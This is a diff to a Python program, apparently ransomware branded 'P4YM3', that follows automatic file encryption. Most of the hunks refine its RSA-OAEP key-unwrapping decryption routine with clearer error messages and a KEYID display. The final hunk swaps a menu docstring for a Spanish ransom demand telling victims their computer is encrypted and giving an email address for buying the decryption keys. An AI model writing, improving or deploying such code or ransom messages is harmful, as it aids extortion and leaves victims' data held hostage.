@@ -419,7 +419,12 @@ def descifrar_archivo_automatico(ruta_entrada: str, private_key_pem_path: str,
     if not os.path.isfile(private_key_pem_path):
         raise FileNotFoundError(f"Clave privada no encontrada: {private_key_pem_path}")
     privkey = cargar_private_key_pem(private_key_pem_path)
-    clave = unwrap_key_rsa_oaep(privkey, wrapped_key)
+    try:
+        clave = unwrap_key_rsa_oaep(privkey, wrapped_key)
+    except Exception as e:
+        # Proveer mensaje de error más claro incluyendo el KEYID del encabezado
+        hint = f". Archivo KEYID={keyid}" if keyid is not None else ""
+        raise ValueError(f"Decryption failed: la clave privada no corresponde con la clave envuelta{hint}") from e
 
     if len(resto) < 16:
         raise ValueError("Archivo corrupto: faltan bytes para el IV.")
@@ -695,6 +700,16 @@ def modo_descifrado_manual():
     if not os.path.isfile(archivo_cifrado):
         print(f"Archivo no encontrado: {archivo_cifrado}")
         return
+    # Intentar leer la cabecera primero para mostrar el KEYID al usuario
+    try:
+        with open(archivo_cifrado, "rb") as f:
+            blob = f.read(8192)
+        _, _, _, _, header_keyid, _, _, _ = _parse_header_2lines(blob)
+        if header_keyid:
+            print(f"Nota: el archivo fue cifrado con KEYID={header_keyid}")
+    except Exception:
+        # No bloquear el flujo por errores al inspeccionar cabecera
+        pass
     clave_privada = input("Ruta a la clave privada RSA para desenvolver (rsa_main_private.pem): ").strip().strip('"')
     if not clave_privada or not os.path.isfile(clave_privada):
         print(f"Clave privada no encontrada: {clave_privada}")
@@ -716,7 +731,7 @@ def modo_descifrado_manual():
 
 # ===== MENÚ PRINCIPAL =====
 def menu_interactivo():
-    """Menú interactivo para descifrar/verificar después del cifrado automático."""
+    """Su equipo acaba de ser encriptado pongase en contacto con este correo para obtener las claves para descifrar los datos pablomartinezpuentes@tutamail.com."""
     while True:
         print("\n" + "=" * 70)
         print("P4YM3 - MENÚ DE OPCIONES")
